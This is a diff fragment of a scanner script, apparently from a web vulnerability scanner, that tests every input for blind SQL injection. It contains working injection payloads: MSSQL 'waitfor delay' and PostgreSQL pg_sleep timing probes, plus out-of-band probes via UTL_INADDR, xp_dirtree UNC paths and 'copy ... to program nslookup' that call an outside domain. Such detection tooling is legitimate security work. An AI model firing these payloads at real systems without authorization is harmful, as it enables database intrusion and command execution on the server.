+                        if (this.testTiming(i, "\"); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, ")); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, "')); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, "\")); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    }
+                }
+                if (doTimingTestsPostgreSQL) {
+                    // timing tests (PostgreSQL)
+                    // no quote
+                    if (this.isNumeric && this.testTiming(i, "-1;select pg_sleep({SLEEP}); -- ")) return true;
+                    // no quote, one parentheses
+                    if (this.isNumeric && this.testTiming(i, "-1);select pg_sleep({SLEEP}); -- ")) return true;
+                    // no quote, two parentheses
+                    if (this.isNumeric && this.testTiming(i, "-1));select pg_sleep({SLEEP}); -- ")) return true;
+                    // single quote
+                    if (this.testTiming(i, "{RANDSTR}';select pg_sleep({SLEEP}); -- ")) return true;
+                    // single quote, one parentheses
+                    if (this.testTiming(i, "{RANDSTR}');select pg_sleep({SLEEP}); -- ")) return true;
+                    // single quote, two parentheses
+                    if (this.testTiming(i, "{RANDSTR}'));select pg_sleep({SLEEP}); -- ")) return true;
+                    //extra tests
+                    if (doTimingTestsPostgreSQLExtra) {
+                        if (this.testTiming(i, "1 or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "' or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "\" or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "1) or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "') or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "\") or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "1)) or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "')) or pg_sleep({SLEEP}); -- ")) return true;
+                        if (this.testTiming(i, "\")) or pg_sleep({SLEEP}); -- ")) return true;
+                    }
+                }
+                if (doTimingTestsRails) {
+                    // for Rails make some extra checks
+                    if (isRails) {
+                        // string concatenation
+                        if (this.testTiming(i, "'||(select 1 from (select pg_sleep({SLEEP}))x)||'")) return true;
+                        // for integer, still using string concatenation
+                        if (this.testTiming(i, "''||(select 1 from (select pg_sleep({SLEEP}))x)||''")) return true;
+                    }
+                }
+            }
+        }
+        if (doOOBTests) {
+            // OOB tests (Oracle)
+            // no quote
+            if (this.isNumeric && this.testOOB(i, "{ORIGVALUE}||UTL_INADDR.get_host_address('{DOMAIN}')", 40)) return true;
+            // single quote
+            if (this.testOOB(i, "'||UTL_INADDR.get_host_address('{DOMAIN}')||'", 41)) return true;
+            // for Windows systems test some Microsoft SQL server OOB tests
+            if (isWindows || isIIS) {
+                // no quote
+                if (this.isNumeric && this.testOOB(i, "{ORIGVALUE};EXEC master..xp_dirtree '\\\\{DOMAIN}\\' -- ", 42)) return true;
+                // single quote
+                if (this.testOOB(i, "{ORIGVALUE}';EXEC master..xp_dirtree '\\\\{DOMAIN}\\' -- ", 43)) return true;
+                // single quote, one parentheses
+                if (this.testOOB(i, "{ORIGVALUE}');EXEC master..xp_dirtree '\\\\{DOMAIN}\\' -- ", 44)) return true;
+            }
+            // OOB tests (PostgreSQL)
+            // no quote
+            if (this.isNumeric && this.testOOB(i, "{ORIGVALUE};copy (select '') to program 'nslookup {DOMAIN}'", 45)) return true;
+            // single quote
+            if (this.testOOB(i, "{ORIGVALUE}';copy (select '') to program 'nslookup {DOMAIN}", 46)) return true;
+        }
+    }
+}
+// main entry point
+/**************************************************************************************************************/
+var bxss_enabled = getGlobalValue('blindxss.enabled');
+var bxss_userId = getGlobalValue('blindxss.userid');
+var bxss_url = getGlobalValue('blindxss.url');
+for (var i=0;i<scheme.inputCount; i++)
+{
+    var tester = new classBlindSQLInj(scheme, i);    
+	
+	tester.inputName = scheme.getInputName(i);
+	tester.inputNameLC = tester.inputName.toLowerCase();
+	
+	if (debug) trace(">>>>>>>>>> TESTING INPUT : " + tester.inputName);
+	
+	//if (tester.inputName == 'user%5Buser_id%5D')
+	
+	tester.startTesting();
+	
+	ScriptProgress(ComputeProgress(i, scheme.inputCount));
+	tester = null;
+}
